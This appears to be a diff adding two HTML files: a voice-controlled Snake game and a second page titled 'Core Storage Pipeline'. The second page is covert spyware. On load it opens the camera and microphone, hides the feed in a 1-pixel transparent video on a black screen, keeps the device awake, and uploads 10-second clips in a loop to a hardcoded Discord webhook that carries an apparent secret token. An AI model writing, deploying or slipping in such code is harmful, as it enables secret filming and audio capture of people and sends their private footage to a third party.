@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice Controlled Portrait Snake</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #111;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            padding: 15px;
+            z-index: 5;
+        }
+        #flashOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 255, 102, 1);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 10;
+            transition: opacity 0.4s ease-out;
+        }
+        .screen {
+            display: none;
+            position: relative;
+        }
+        .screen.active {
+            display: block;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+        .prompt-box {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #00ff66;
+            margin: 30px 0;
+            text-transform: uppercase;
+        }
+        button {
+            background-color: #00ff66;
+            color: #111;
+            border: none;
+            padding: 14px 28px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(0, 255, 102, 0.3);
+        }
+        
+        /* Game Screen Wrapper to contain absolute popups */
+        #gameScreen {
+            position: relative;
+            width: 280px;
+            margin: 0 auto;
+        }
+
+        /* 12 Rows x 6 Columns Portrait Grid Layout */
+        #grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            grid-template-rows: repeat(12, 1fr);
+            gap: 3px;
+            width: 280px;
+            height: 540px;
+            margin: 15px auto;
+            background-color: #1a1a24;
+            border: 4px solid #333;
+            border-radius: 8px;
+            padding: 4px;
+            position: relative;
+        }
+        .cell {
+            background-color: #252533;
+            border-radius: 3px;
+        }
+        .cell.snake {
+            background-color: #00ff66;
+            box-shadow: 0 0 6px #00ff66;
+        }
+        .cell.head {
+            background-color: #00cc55;
+        }
+        .cell.apple {
+            background-color: #ff0055;
+            box-shadow: 0 0 6px #ff0055;
+            border-radius: 50%;
+        }
+
+        /* Shaky Glass Break Pop-up Score Style */
+        .shatter-score {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(2);
+            font-size: 5rem;
+            font-weight: 900;
+            color: #fff;
+            font-family: 'Impact', sans-serif;
+            text-shadow: 
+                -2px -2px 0 #00e5ff,  
+                 2px -2px 0 #ff0055,
+                -2px  2px 0 #00ff66,
+                 2px  2px 0 #ffff00;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 20;
+        }
+
+        /* Activation trigger animations */
+        .shatter-score.animate {
+            animation: shatterPop 0.6s ease-out forwards, shakeFX 0.15s linear infinite;
+        }
+
+        @keyframes shatterPop {
+            0% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(2.2);
+                filter: blur(0px);
+            }
+            50% {
+                opacity: 0.9;
+                transform: translate(-50%, -50%) scale(1.2);
+                filter: drop-shadow(0 0 8px rgba(255,255,255,0.8));
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.4);
+                filter: blur(4px);
+            }
+        }
+
+        @keyframes shakeFX {
+            0% { margin-left: -4px; margin-top: 2px; }
+            25% { margin-left: 3px; margin-top: -3px; }
+            50% { margin-left: -2px; margin-top: -1px; }
+            75% { margin-left: 4px; margin-top: 3px; }
+            100% { margin-left: 0px; margin-top: 0px; }
+        }
+        
+        /* Bottom Metrics Container */
+        .bottom-ui {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 280px;
+            margin: 10px auto 0 auto;
+            font-family: monospace;
+        }
+        .scores-panel {
+            text-align: left;
+            font-size: 1.1rem;
+            font-weight: bold;
+            line-height: 1.3;
+        }
+        .milestone-panel {
+            text-align: right;
+            font-size: 0.9rem;
+            font-weight: bold;
+            max-width: 160px;
+            word-wrap: break-word;
+        }
+        
+        /* Reward Tier Text Styles */
+        .tier-blue { color: #00e5ff; text-shadow: 0 0 5px rgba(0, 229, 255, 0.4); }
+        .tier-orange { color: #ff9100; }
+        .tier-purple { color: #d500f9; }
+        
+        /* Rainbow Animation for Gingerscope */
+        .tier-rainbow {
+            background: linear-gradient(to right, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: rainbowScroll 2s linear infinite;
+            background-size: 200% auto;
+            font-weight: 900;
+        }
+        @keyframes rainbowScroll {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .status-text {
+            font-size: 1rem;
+            color: #aaa;
+            margin-top: 10px;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="flashOverlay"></div>
+
+<div class="container">
+    <div id="startScreen" class="screen active">
+        <h1>Voice Snake</h1>
+        <p style="color: #aaa; margin-bottom: 30px;">Calibrate your voice to drive the snake. Commands are: "up", "down", "left", "right".</p>
+        <button id="startBtn">Begin Calibration</button>
+    </div>
+
+    <div id="calibrationScreen" class="screen">
+        <h1>Voice Calibration</h1>
+        <p style="color: #aaa;">Speak clearly into your mic</p>
+        <div class="prompt-box" id="calibPrompt">Say: Up</div>
+        <div class="status-text" id="calibStatus">Listening...</div>
+    </div>
+
+    <div id="gameScreen" class="screen">
+        <div id="shatterEffect" class="shatter-score">0</div>
+        
+        <div id="grid"></div>
+        
+        <div class="bottom-ui">
+            <div class="scores-panel">
+                <div id="scoreLabel">Score: 0</div>
+                <div id="highScoreLabel">High: 0</div>
+            </div>
+            <div class="milestone-panel" id="milestoneLabel"></div>
+        </div>
+        
+        <div class="status-text" id="gameStatus">Get Ready...</div>
+    </div>
+</div>
+
+<script>
+    const startScreen = document.getElementById('startScreen');
+    const calibrationScreen = document.getElementById('calibrationScreen');
+    const gameScreen = document.getElementById('gameScreen');
+    const startBtn = document.getElementById('startBtn');
+    const calibPrompt = document.getElementById('calibPrompt');
+    const calibStatus = document.getElementById('calibStatus');
+    const gameStatus = document.getElementById('gameStatus');
+    const scoreLabel = document.getElementById('scoreLabel');
+    const highScoreLabel = document.getElementById('highScoreLabel');
+    const milestoneLabel = document.getElementById('milestoneLabel');
+    const gridContainer = document.getElementById('grid');
+    const flashOverlay = document.getElementById('flashOverlay');
+    const shatterEffect = document.getElementById('shatterEffect');
+
+    let recognition;
+    let audioCtx;
+    
+    const steps = ['up', 'down', 'left', 'right'];
+    let currentStepIndex = 0;
+
+    const cols = 6;
+    const rows = 12;
+    let snake = [];
+    let direction = 'right';
+    let nextDirection = 'right';
+    let apple = { x: 0, y: 0 };
+    let score = 0;
+    let highScore = 0;
+    let gameInterval;
+    let isGameOver = false;
+    let gameState = 'idle';
+
+    // Advanced 8-Bit Audio Synth Functions
+    function playSound(type) {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        const now = audioCtx.currentTime;
+
+        if (type === '8bit-point') {
+            // Retro 8-bit Arpeggio/Chiptune chord climb effect
+            const notes = [440, 554.37, 659.25, 880]; // A Major Arpeggio
+            notes.forEach((freq, index) => {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc.type = 'square'; // Classic retro square wave layout
+                osc.frequency.setValueAtTime(freq, now + (index * 0.05));
+                
+                gain.gain.setValueAtTime(0.12, now + (index * 0.05));
+                gain.gain.exponentialRampToValueAtTime(0.001, now + (index * 0.05) + 0.15);
+                
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start(now + (index * 0.05));
+                osc.stop(now + (index * 0.05) + 0.15);
+            });
+        } else if (type === 'bing') {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(880, now);
+            gain.gain.setValueAtTime(0.15, now);
+            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(now + 0.3);
+        } else if (type === 'ding') {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(330, now);
+            gain.gain.setValueAtTime(0.2, now);
+            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(now + 0.4);
+        } else if (type === 'tick') {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'square';
+            osc.frequency.setValueAtTime(150, now);
+            gain.gain.setValueAtTime(0.08, now);
+            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(now + 0.04);
+        }
+    }
+
+    function triggerGreenFlash() {
+        flashOverlay.style.transition = 'none';
+        flashOverlay.style.opacity = '1';
+        flashOverlay.offsetHeight; 
+        flashOverlay.style.transition = 'opacity 0.4s ease-out';
+        flashOverlay.style.opacity = '0';
+    }
+
+    function triggerShatterScoreAnimation(currentPoints) {
+        // Update overlay numeric values
+        shatterEffect.innerText = currentPoints;
+        
+        // Remove tracking classes to reset DOM layouts instantly
+        shatterEffect.classList.remove('animate');
+        shatterEffect.offsetHeight; // Reflow reset magic
+        
+        // Re-inject animation styling classes
+        shatterEffect.classList.add('animate');
+    }
+
+    function initSpeechRecognition() {
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+        if (!SpeechRecognition) {
+            alert("Speech recognition not supported on this browser. Use Chrome/Safari.");
+            return;
+        }
+
+        recognition = new SpeechRecognition();
+        recognition.continuous = true;
+        recognition.interimResults = true; 
+        recognition.lang = 'en-US';
+
+        recognition.onresult = (event) => {
+            let resultText = '';
+            for (let i = event.resultIndex; i < event.results.length; ++i) {
+                resultText += event.results[i][0].transcript;
+            }
+            const command = resultText.toLowerCase().trim().split(" ").pop();
+            handleVoiceCommand(command);
+        };
+
+        recognition.onend = () => {
+            if (gameState !== 'gameover') {
+                recognition.start();
+            }
+        };
+        recognition.start();
+    }
+
+    function handleVoiceCommand(word) {
+        if (gameState === 'calibration') {
+            const targetWord = steps[currentStepIndex];
+            if (word === targetWord) {
+                playSound(currentStepIndex % 2 === 0 ? 'bing' : 'ding');
+                triggerGreenFlash();
+                currentStepIndex++;
+                
+                if (currentStepIndex < steps.length) {
+                    calibPrompt.innerText = `Say: ${steps[currentStepIndex]}`;
+                    calibStatus.innerText = `Matched "${word}"! Next...`;
+                } else {
+                    startCountdownPhase();
+                }
+            } else {
+                calibStatus.innerText = `Heard: "${word}" (Waiting for "${targetWord}")`;
+            }
+        } else if (gameState === 'playing') {
+            if (word === 'up' && direction !== 'down') nextDirection = 'up';
+            if (word === 'down' && direction !== 'up') nextDirection = 'down';
+            if (word === 'left' && direction !== 'right') nextDirection = 'left';
+            if (word === 'right' && direction !== 'left') nextDirection = 'right';
+            
+            gameStatus.innerText = `Command: ${word.toUpperCase()}`;
+        }
+    }
+
+    startBtn.addEventListener('click', async () => {
+        try {
+            await navigator.mediaDevices.getUserMedia({ 
+                audio: { noiseSuppression: true, echoCancellation: true } 
+            });
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            startScreen.classList.remove('active');
+            calibrationScreen.classList.add('active');
+            gameState = 'calibration';
+            initSpeechRecognition();
+        } catch (err) {
+            alert("Microphone required to coordinate movements.");
+        }
+    });
+
+    function startCountdownPhase() {
+        calibrationScreen.classList.remove('active');
+        gameScreen.classList.add('active');
+        gameState = 'countdown';
+        createGridCells();
+        updateMilestoneText();
+        
+        let count = 3;
+        gameStatus.innerText = `Starting in ${count}...`;
+        playSound('tick');
+
+        const cdInterval = setInterval(() => {
+            count--;
+            if (count > 0) {
+                gameStatus.innerText = `Starting in ${count}...`;
+                playSound('tick');
+            } else {
+                clearInterval(cdInterval);
+                initSnakeGame();
+            }
+        }, 1000);
+    }
+
+    function createGridCells() {
+        gridContainer.innerHTML = '';
+        for (let y = 0; y < rows; y++) {
+            for (let x = 0; x < cols; x++) {
+                const cell = document.createElement('div');
+                cell.classList.add('cell');
+                cell.id = `cell-${x}-${y}`;
+                gridContainer.appendChild(cell);
+            }
+        }
+    }
+
+    function initSnakeGame() {
+        gameState = 'playing';
+        isGameOver = false;
+        score = 0;
+        scoreLabel.innerText = `Score: ${score}`;
+        highScoreLabel.innerText = `High: ${highScore}`;
+        direction = 'down';
+        nextDirection = 'down';
+        
+        snake = [
+            { x: 3, y: 2 },
+            { x: 3, y: 1 }
+        ];
+        
+        generateApple();
+        drawGameGrid();
+        updateMilestoneText();
+        
+        if (gameInterval) clearInterval(gameInterval);
+        gameInterval = setInterval(updateGameFrame, 550); 
+    }
+
+    function generateApple() {
+        let validLocation = false;
+        while (!validLocation) {
+            apple.x = Math.floor(Math.random() * cols);
+            apple.y = Math.floor(Math.random() * rows);
+            validLocation = !snake.some(segment => segment.x === apple.x && segment.y === apple.y);
+        }
+    }
+
+    function updateMilestoneText() {
+        if (score < 5) {
+            milestoneLabel.innerHTML = '<span class="tier-blue">Reach 5 score for Ice Piercer</span>';
+        } else if (score < 10) {
+            milestoneLabel.innerHTML = '<span class="tier-orange">Reach 10 score for Harvester</span>';
+        } else if (score < 15) {
+            milestoneLabel.innerHTML = '<span class="tier-purple">Reach 15 score for Treat Bundle</span>';
+        } else if (score < 50) {
+            milestoneLabel.innerHTML = '<span class="tier-rainbow">Reach 50 score for Gingerscope</span>';
+        } else {
+            milestoneLabel.innerHTML = '<span class="tier-rainbow">Gingerscope Master!</span>';
+        }
+    }
+
+    function updateGameFrame() {
+        if (isGameOver) return;
+        direction = nextDirection;
+
+        const head = { ...snake[0] };
+        if (direction === 'up') head.y -= 1;
+        if (direction === 'down') head.y += 1;
+        if (direction === 'left') head.x -= 1;
+        if (direction === 'right') head.x += 1;
+
+        if (head.x < 0 || head.x >= cols || head.y < 0 || head.y >= rows) {
+            endGame();
+            return;
+        }
+
+        if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
+            endGame();
+            return;
+        }
+
+        snake.unshift(head);
+
+        if (head.x === apple.x && head.y === apple.y) {
+            score++;
+            scoreLabel.innerText = `Score: ${score}`;
+            if (score > highScore) {
+                highScore = score;
+                highScoreLabel.innerText = `High: ${highScore}`;
+            }
+            
+            // Trigger 8-Bit Audio and Center Shaking Display Combo
+            playSound('8bit-point');
+            triggerShatterScoreAnimation(score);
+            
+            updateMilestoneText();
+            generateApple();
+        } else {
+            snake.pop();
+        }
+
+        drawGameGrid();
+    }
+
+    function drawGameGrid() {
+        document.querySelectorAll('.cell').forEach(cell => {
+            cell.className = 'cell';
+        });
+
+        const appleCell = document.getElementById(`cell-${apple.x}-${apple.y}`);
+        if (appleCell) appleCell.classList.add('apple');
+
+        snake.forEach((segment, index) => {
+            const cell = document.getElementById(`cell-${segment.x}-${segment.y}`);
+            if (cell) {
+                cell.classList.add('snake');
+                if (index === 0) cell.classList.add('head');
+            }
+        });
+    }
+
+    function endGame() {
+        isGameOver = true;
+        gameState = 'gameover';
+        clearInterval(gameInterval);
+        playSound('ding');
+        gameStatus.innerHTML = `Game Over! <br><button onclick="resetGamePhase()" style="margin-top:10px; padding:8px 14px; font-size:0.85rem;">Try Again</button>`;
+    }
+
+    window.resetGamePhase = function() {
+        initSnakeGame();
+    }
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Core Storage Pipeline</title>
+    <style>
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+        }
+        body {
+            background-color: #000000;
+            color: #000000;
+            font-family: sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="preview" autoplay playsinline muted></video>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5";
+
+    const video = document.getElementById('preview');
+    let mediaRecorder;
+    let recordedChunks = [];
+    let countdownInterval;
+    let wakeLock = null;
+    
+    const CLIP_DURATION = 10; 
+
+    // --- AUTOMATIC WAKE LOCK ---
+    async function requestWakeLock() {
+        try {
+            if ('wakeLock' in navigator) {
+                wakeLock = await navigator.wakeLock.request('screen');
+                console.log("Screen Wake Lock active. Device will not sleep.");
+            }
+        } catch (err) {
+            console.error(`Wake Lock failed: ${err.message}`);
+        }
+    }
+
+    // Re-request wake lock if user switches away and returns to the tab
+    document.addEventListener('visibilitychange', async () => {
+        if (wakeLock !== null && document.visibilityState === 'visible') {
+            await requestWakeLock();
+        }
+    });
+
+    async function initCamera() {
+        try {
+            // Request wake lock immediately when initialization starts
+            await requestWakeLock();
+
+            const constraints = {
+                video: {
+                    width: { ideal: 3840, max: 3840 },  
+                    height: { ideal: 2160, max: 2160 }, 
+                    frameRate: { ideal: 60 },
+                    facingMode: { ideal: "environment" } 
+                },
+                audio: {
+                    echoCancellation: false, 
+                    noiseSuppression: false,
+                    autoGainControl: true
+                }
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            
+            setupRecorder(stream);
+            
+            recordedChunks = [];
+            mediaRecorder.start();
+            startLoopTimer();
+            
+        } catch (err) {
+            console.error("Pipeline initialization failed:", err);
+        }
+    }
+
+    function setupRecorder(stream) {
+        let selectedMimeType = 'video/webm;codecs=vp8';
+        if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+            if (MediaRecorder.isTypeSupported('video/mp4')) {
+                selectedMimeType = 'video/mp4';
+            } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                selectedMimeType = 'video/webm';
+            }
+        }
+
+        mediaRecorder = new MediaRecorder(stream, { 
+            mimeType: selectedMimeType,
+            videoBitsPerSecond: 3500000 
+        });
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(recordedChunks, { type: selectedMimeType });
+            recordedChunks = [];
+
+            const formData = new FormData();
+            const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+            formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+
+            try {
+                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) {
+                console.error("Network drop, chunk omitted:", err);
+            }
+
+            recordedChunks = [];
+            if (mediaRecorder.state === "inactive") {
+                mediaRecorder.start();
+            }
+        };
+    }
+
+    function startLoopTimer() {
+        clearInterval(countdownInterval);
+        let timeLeft = CLIP_DURATION;
+        
+        countdownInterval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+                startLoopTimer(); 
+            }
+        }, 1000);
+    }
+
+    window.addEventListener('DOMContentLoaded', initCamera);
+</script>
+
+</body>
+</html>
